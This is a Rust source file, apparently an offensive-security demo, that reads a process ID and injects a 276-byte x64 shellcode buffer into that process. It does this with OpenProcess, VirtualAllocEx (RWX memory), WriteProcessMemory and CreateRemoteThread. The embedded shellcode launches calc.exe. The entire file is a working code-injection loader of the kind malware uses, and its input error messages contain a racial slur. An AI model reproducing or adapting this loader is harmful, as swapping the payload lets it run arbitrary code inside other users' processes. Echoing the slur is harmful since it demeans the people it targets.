use {
    winapi::{
        shared::minwindef::DWORD,
        um::{
            winnt::*,
            memoryapi::*,
            processthreadsapi::*,
            handleapi::*,
            winuser::*,
            errhandlingapi::*
        }
    },
    std::{
        io,
        ptr
    }
};


fn main(){

    const BUFFER: [u8; 276] = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,
    0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
    0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
    0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
    0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
    0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
    0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
    0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
    0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
    0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
    0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
    0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
    0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
    0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
    0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
    0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
    0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
    0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,
    0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,
    0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,
    0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,
    0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
    0x63,0x2e,0x65,0x78,0x65,0x00];

    let mut pid: String = String::new();
    println!("[+] Process ID : ");
    io::stdin()
        .read_line(&mut pid)
        .expect("enter a number nigger!");
    
    let procid: DWORD = pid.trim().parse()
        .expect("enter an integer nigger!");

    let hProcess: HANDLE = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, procid) };
    if hProcess == INVALID_HANDLE_VALUE {
        unsafe {
            println!("OpenProcess error : {}", GetLastError());
            CloseHandle(hProcess)
        };
    }
    
    let alloc = unsafe { VirtualAllocEx(hProcess, ptr::null_mut(), std::mem::size_of_val(&BUFFER), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) };
    if alloc == ptr::null_mut() {
        unsafe { println!("VirtualAllocEx error : {}", GetLastError()) };
    }
    
    let wpm: i32 = unsafe { WriteProcessMemory(hProcess, alloc, BUFFER.as_ptr() as *const _, std::mem::size_of_val(&BUFFER), ptr::null_mut()) };
    if wpm == 0 {
        unsafe { println!("WriteProcessMemory error : {}", GetLastError()) };
    }
    
    let crt: HANDLE = unsafe { CreateRemoteThread(hProcess, ptr::null_mut(), 0, Some(std::mem::transmute(alloc)), ptr::null_mut(), 0, ptr::null_mut()) };
    if crt == INVALID_HANDLE_VALUE {
        unsafe { 
            println!("CreateRemoteThread error : {}", GetLastError());
            CloseHandle(crt)
        };
    }
    unsafe {
        CloseHandle(hProcess);
        CloseHandle(crt) 
    };
}
